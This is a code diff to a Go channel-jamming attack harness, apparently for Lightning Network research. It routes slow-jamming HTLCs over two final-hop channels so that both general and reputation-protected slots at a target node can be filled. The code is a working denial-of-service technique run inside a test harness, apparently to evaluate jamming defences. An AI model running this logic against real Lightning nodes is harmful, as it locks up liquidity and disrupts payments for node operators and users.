@@ -43,18 +43,32 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 
 	log.Printf("Reputation building endorsed: %v", endorsed)
 
+	// Get the channel IDs of our last hop channels with the target peer.
+	// We'll need these to split our jamming htlcs over the general slots
+	// of two channels, because our target isn't guaranteed access to all
+	// the protected slots.
+	finalSCIDs, err := graph.ListChannelIDs(ctx, 2)
+	if err != nil {
+		return fmt.Errorf("list channel ids: %w", err)
+	}
+	if len(finalSCIDs) != 2 {
+		return fmt.Errorf("expected 2 channels with peer, got: %v",
+			len(finalSCIDs))
+	}
+
 	// Once endorsement has been built up, we've at least reached the
 	// threshold reputation required to get a htlc endorsed. We'll now
 	// take two steps:
 	// 1. Slow jam general slots with one of our nodes
 	// 2. Build reputation for access to protected slots with the other
-	chans, err := slowJamGeneral(ctx, jammer)
+	chans, err := slowJamGeneral(ctx, jammer, finalSCIDs[0])
 	if err != nil {
 		return fmt.Errorf("slow jamming: %w", err)
 	}
 
 	// While WIP, cancel these payments back for easier cleanup.
-	log.Printf("Dispatched: %v general slow jams", len(chans))
+	log.Printf("Dispatched: %v general slow jams over: %v", len(chans),
+		finalSCIDs[0].ToUint64())
 
 	var wg sync.WaitGroup
 
@@ -72,7 +86,8 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 			len(chans), n)
 	}()
 
-	// Get the route we'll use for our protected jamming.
+	// Get the route we'll use for our protected jamming, using the last
+	// channel that was *not* used to jam general.
 	probeAmt := lnwire.MilliSatoshi(400_000)
 	zeroToTwo, err := jammer.LndNodes.GetNode(0).Client.QueryRoutes(
 		ctx,
@@ -82,6 +97,7 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 			FeeLimitMsat: lnwire.MaxMilliSatoshi,
 		},
 	)
+	zeroToTwo.Hops[len(zeroToTwo.Hops)-1].ChannelID = finalSCIDs[1].ToUint64()
 
 	log.Print("Paying for reputation to access protected slots")
 	err = buildReputationForProtected(ctx, jammer, zeroToTwo, targetNode)
@@ -94,7 +110,8 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 		return fmt.Errorf("slow jam protected: %w", err)
 	}
 
-	log.Printf("Dispatched: %v protected slow jams", len(chans))
+	log.Printf("Dispatched: %v protected slow jams over: %v", len(chans),
+		finalSCIDs[1].ToUint64())
 
 	wg.Add(1)
 	go func() {
@@ -209,8 +226,8 @@ func jamProtected(ctx context.Context, j *JammingHarness,
 	return jamChans, nil
 }
 
-func slowJamGeneral(ctx context.Context, j *JammingHarness) (
-	[]jamPair, error) {
+func slowJamGeneral(ctx context.Context, j *JammingHarness,
+	lastChannel lnwire.ShortChannelID) ([]jamPair, error) {
 
 	// Just above the dust limit.
 	jamAmt := lnwire.MilliSatoshi(400_000)
@@ -225,6 +242,8 @@ func slowJamGeneral(ctx context.Context, j *JammingHarness) (
 	if err != nil {
 		return nil, fmt.Errorf("0 -> 2: %w", err)
 	}
+
+	oneToTwo.Hops[len(oneToTwo.Hops)-1].ChannelID = lastChannel.ToUint64()
 
 	wait, err := getSlowJamHold(ctx, oneToTwo, j)
 	if err != nil {
